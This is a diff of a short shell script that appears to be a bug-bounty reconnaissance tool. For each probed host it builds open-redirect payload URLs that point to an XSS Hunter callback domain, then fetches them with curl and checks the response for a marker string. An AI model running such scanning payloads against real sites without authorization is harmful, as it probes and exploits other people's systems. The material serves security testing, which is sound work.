@@ -30,6 +30,9 @@ ls ; wc -l $input
 
 
 
+
+
+
 #创建目录
 input=httprobe.txt ; export input=httprobe.txt
 
@@ -39,15 +42,15 @@ do
 
 mkdir /root/script/3_httprobe/dir_$i
 
-echo "${line}//xsshunternihao.xss.ht/%2f%2e%2e" >> /root/script/3_httprobe/dir_$i/red.txt
-echo "${line}/http://xsshunternihao.xss.ht" >> /root/script/3_httprobe/dir_$i/red.txt
+echo "${line}//xsshunternihao.xss.ht/%2f%2e%2e" |tee -a /root/script/3_httprobe/dir_$i/red.txt
+echo "${line}/http://xsshunternihao.xss.ht" |tee -a /root/script/3_httprobe/dir_$i/red.txt
 
 done
 
 for line in `cat /root/script/3_httprobe/dir_$i/red.txt`
 do
 
-curl -L "$line" | grep -oP "XSS Hunter Team" >> $output/red_xss.txt && echo "$line" >> $output/red_xss.txt
+curl -L "$line" | grep -oP "XSS Hunter Team" |tee -a $output/red_xss.txt && echo "$line" >> $output/red_xss.txt
 
 done
 
